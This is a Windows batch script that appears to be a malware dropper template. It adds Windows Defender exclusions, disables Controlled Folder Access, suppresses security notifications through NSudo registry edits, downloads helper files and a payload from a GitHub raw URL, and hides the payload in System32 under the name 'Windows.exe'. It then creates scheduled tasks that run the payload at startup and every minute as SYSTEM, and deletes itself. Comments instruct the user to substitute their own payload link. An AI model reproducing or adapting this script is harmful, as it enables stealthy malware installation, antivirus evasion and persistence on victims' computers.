color ef
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
powershell -Command "Unblock-file 'AV.bat'"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
start /min AV.bat
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
::disables ControlledFolderAccess to access files and folders
powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
::windows defender exclusions
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
::direct download link
::edit this to your files
md "%systemroot%\System32\Windowsexe"


::upload files here: github.com - create account and create repository (public) then upload files
::put payload file DIRECT download link here:
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.exe" --output "%appdata%\Windows.exe"
::do not change the --output


move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Windows.exe'"
start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST
SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
del NSudo.exe
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit
